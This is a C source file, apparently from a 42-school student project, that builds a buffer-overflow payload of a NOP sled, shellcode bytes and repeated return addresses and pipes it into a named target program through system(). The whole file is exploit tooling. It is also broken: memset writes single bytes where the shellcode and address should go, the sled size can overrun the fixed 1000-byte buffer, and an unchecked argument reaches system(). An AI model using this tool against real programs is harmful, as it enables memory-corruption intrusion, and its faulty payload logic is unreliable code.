/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   sled.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: angonyam <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/11/15 09:13:10 by angonyam          #+#    #+#             */
/*   Updated: 2017/11/15 15:26:28 by angonyam         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "../shell.h"

char			*generate_cmd(char *atk, char *exploit)
{
	char		*cmd;
	char		*payload;

	cmd = ft_strjoin(atk, " |");
	payload = ft_strjoin(cmd, exploit);
	return (payload);
}

uint32_t		hex2int(char *hex) 
{
	uint32_t	byte;
    uint32_t	val;
    
	val = 0;
	while (*hex) 
	{  
		byte = *hex++; 
        if (byte >= '0' && byte <= '9') 
			byte = byte - '0';
        else if (byte >= 'a' && byte <='f') 
			byte = byte - 'a' + 10;
        else if (byte >= 'A' && byte <='F') 
			byte = byte - 'A' + 10;    
       val = (val << 4) | (byte & 0xF);
    }
    return val;
}

char		*sled(int size, int bin, int retaddr, int retaddrsize)
{
	char			*new; 
	char			*plc;
	int				total;
	int				i;

	total = size + sizeof(bin) + (sizeof(retaddr) * retaddrsize);
	new = (char*)malloc(sizeof(char) * 1000);
	plc = new;
	memset(new, 0x90, size * 4);
	new += size;
	memset(new, bin, sizeof(bin));
	new += sizeof(bin);
	memset(new, retaddr, sizeof(retaddr) * retaddrsize);
	return (plc);
}

int			main(int argc, char **argv)
{
	int		shellcode;
	int		ret;
	int		size;
	int		retsize;
	char	*atk;
	char	*payload;

	if (argc == 1)
	{
		printf("Usage: %s [NOP-sled-size] [shellcode] [return-addr] [return-addr-size] [target]",
				argv[0]);
		return (-1);
	}
	size = atoi(argv[1]);
	shellcode = hex2int(argv[2]);
	ret = hex2int(argv[3]);
	retsize = atoi(argv[4]);
	atk = sled(size, shellcode, ret, retsize);	
	payload = generate_cmd(atk, argv[5]);
	printf("%s", atk);
	system(payload);
	return (0);
}
